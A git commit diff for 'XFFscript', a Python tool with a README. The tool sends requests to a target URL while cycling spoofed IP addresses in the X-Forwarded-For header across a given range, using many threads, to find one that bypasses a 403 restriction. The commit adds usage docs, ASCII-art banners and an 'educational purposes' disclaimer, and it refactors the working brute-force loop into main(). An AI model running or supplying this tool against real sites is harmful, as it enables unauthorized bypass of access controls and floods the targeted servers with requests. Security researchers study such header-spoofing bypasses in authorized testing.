6b47bcc798dcf7d655a9e36b512b4f5a5afe1b5f
theodorsm <theodor@midtlien.com>
2020-04-16 22:16:36 +0200

    Update README and docs in script

--- README.md
+++ README.md
@@ -1,2 +1,44 @@
 # XFFscript
-Python script to enumerate IP addresses in http X-Forwarded-For field. 
+<!-- language: lang-none -->
+     __    __  ________  ________                              __             __
+    |  \  |  \|        \|        \                            |  \           |  \
+    | $$  | $$| $$$$$$$$| $$$$$$$$_______   _______   ______   \$$  ______  _| $$_
+     \$$\/  $$| $$__    | $$__   /       \ /       \ /      \ |  \ /      \|   $$ \
+      >$$  $$ | $$  \   | $$  \ |  $$$$$$$|  $$$$$$$|  $$$$$$\| $$|  $$$$$$\\$$$$$$
+     /  $$$$\ | $$$$$   | $$$$$  \$$    \ | $$      | $$   \$$| $$| $$  | $$ | $$ __
+    |  $$ \$$\| $$      | $$     _\$$$$$$\| $$_____ | $$      | $$| $$__/ $$ | $$|  \
+    | $$  | $$| $$      | $$    |       $$ \$$     \| $$      | $$| $$    $$  \$$  $$
+     \$$   \$$ \$$       \$$     \$$$$$$$   \$$$$$$$ \$$       \$$| $$$$$$$    \$$$$
+                                                                  | $$
+                                                                  | $$
+                                                                   \$$
+This repo contains a Python script to enumerate IP addresses in http X-Forwarded-For field. Can be used to find IP's to bypass 403 restrictions. This script is inspired by and is an updated version of https://github.com/omespino/enumXFF   
+
+# Setup
+
+```
+# Recomended to use virtual enviroment to keep your own enviroment clean
+$python3 -m venv venv && source venv/bin/activate
+
+$ pip3 install -r requirements.txt
+```
+
+# Usage
+´´´
+$ python XFFscript.py -h
+usage: XFFscript.py [-h] -t TARGET [-c STATUS_CODE] -r RANGE [-w WORKERS] [-o OUTPUT]
+
+optional arguments:
+  -h, --help            show this help message and exit
+  -t TARGET, --target TARGET
+                        Restricted Page (target)
+  -c STATUS_CODE, --status_code STATUS_CODE
+                        Restricted Access status code - default is 403
+  -r RANGE, --range RANGE
+                        IP range i.e. 0.0.0.0-255.255.255.255
+  -w WORKERS, --workers WORKERS
+                        Worker/thread count - default is 100
+  -o OUTPUT, --output OUTPUT
+                        If an IP address returns another status code, save IP address to file
+
+´´´
--- XFFscript.py
+++ XFFscript.py
@@ -1,4 +1,24 @@
 #!/usr/bin/env python3
+
+'''
+ __    __  ________  ________                              __             __
+|  \  |  \|        \|        \                            |  \           |  \
+| $$  | $$| $$$$$$$$| $$$$$$$$_______   _______   ______   \$$  ______  _| $$_
+ \$$\/  $$| $$__    | $$__   /       \ /       \ /      \ |  \ /      \|   $$ \
+  >$$  $$ | $$  \   | $$  \ |  $$$$$$$|  $$$$$$$|  $$$$$$\| $$|  $$$$$$\\$$$$$$
+ /  $$$$\ | $$$$$   | $$$$$  \$$    \ | $$      | $$   \$$| $$| $$  | $$ | $$ __
+|  $$ \$$\| $$      | $$     _\$$$$$$\| $$_____ | $$      | $$| $$__/ $$ | $$|  \
+| $$  | $$| $$      | $$    |       $$ \$$     \| $$      | $$| $$    $$  \$$  $$
+ \$$   \$$ \$$       \$$     \$$$$$$$   \$$$$$$$ \$$       \$$| $$$$$$$    \$$$$
+                                                              | $$
+                                                              | $$
+                                                               \$$
+Github: https://github.com/theodorsm/XFFscript
+inspired by https://github.com/omespino/enumXFF
+Author: theodorsm
+Use at your own risk. Usage might be illegal in certain circumstances.
+Only for educational purposes!
+'''
 from concurrent.futures import ThreadPoolExecutor
 from requests_futures.sessions import FuturesSession
 from tqdm import tqdm
@@ -13,23 +33,38 @@ parser.add_argument("-w", "--workers", help="Worker/thread count - default is 10
 parser.add_argument("-o", "--output", help="If an IP address returns another status code, save IP address to file", default="working_ips.txt")
 args = parser.parse_args()
 
-session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))
+def main():
+    print("""
+###########
+# Github: https://github.com/theodorsm/XFFscript
+# inspired by https://github.com/omespino/enumXFF
+# Author: theodorsm
+#
+# Use at your own risk. Usage might be illegal in certain circumstances.
+# Only for educational purposes!
+###########
+""")
+    session = FuturesSession(executor=ThreadPoolExecutor(max_workers=args.workers))
 
-def generate_ips(ip_range):
-    ip_start = ip_range.split("-")[0]
-    ip_end = ip_range.split("-")[1]
-    r = iptools.IpRange(ip_start, ip_end)
-    return r
+    def generate_ips(ip_range):
+        ip_start = ip_range.split("-")[0]
+        ip_end = ip_range.split("-")[1]
+        r = iptools.IpRange(ip_start, ip_end)
+        return r
 
-ip_addresses = generate_ips(args.range)
+    ip_addresses = generate_ips(args.range)
 
-for ip in tqdm(ip_addresses):
-    ip_list = ("{0}, ".format(ip) * 50)[:-2]
-    x_forwarded_for_header = {"X-Forwarded-For" : ip_list}
-    future = session.get(args.target, headers=x_forwarded_for_header)
-    response = future.result()
-    if response.status_code != args.status_code:
-        ip_save_file = open(args.output, "a")
-        ip_save_file.write(args.target + ": " + str(x_forwarded_for_header) + "\n")
-        print(response.status_code + " \nAccess granted with {0}".format(ip))
-        break
+    for ip in tqdm(ip_addresses):
+        ip_list = ("{0}, ".format(ip) * 50)[:-2]
+        x_forwarded_for_header = {"X-Forwarded-For" : ip_list}
+        future = session.get(args.target, headers=x_forwarded_for_header)
+        response = future.result()
+        if response.status_code != args.status_code:
+            ip_save_file = open(args.output, "a")
+            ip_save_file.write(args.target + ": " + str(x_forwarded_for_header) + "\n")
+            print(response.status_code + " \nAccess granted with {0}".format(ip))
+            break
+
+if __name__ == '__main__':
+    main()
+
